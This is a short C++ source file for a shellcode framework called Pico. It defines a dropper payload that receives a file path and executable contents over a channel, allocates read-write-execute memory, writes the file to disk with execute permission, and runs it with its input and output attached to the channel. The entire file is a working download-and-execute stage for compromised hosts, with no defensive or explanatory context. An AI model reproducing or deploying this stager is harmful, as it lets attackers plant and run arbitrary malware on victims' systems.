#include <factory.h>

#include "pico/channel.cc"
#include "pico/io.cc"
#include "pico/memory.cc"
#include "pico/process.cc"

using namespace Pico;

SHELLCODE_ENTRY
{
    Channel channel;
    unsigned int file_sz;
    char file_path[256];

    /* Read the path. */
    channel.recv(file_path, sizeof(file_path));

    /* Read the file size. */
    channel.recv(&file_sz, sizeof(file_sz));
    
    /* Read the file data. */
    void *file_contents = Memory::allocate(file_sz, Memory::READ | Memory::WRITE | Memory::EXEC);
    channel.recv(file_contents, file_sz);

    /* Drop executable file. */
    drop_file(file_path, S_IRUSR|S_IWUSR|S_IXUSR, file_contents, file_sz); 

    char *const argv[] = { NULL };
    char *const envp[] = { NULL };

    /* Execute the dropped executable. */
    execute(file_path, argv, envp, channel);
}
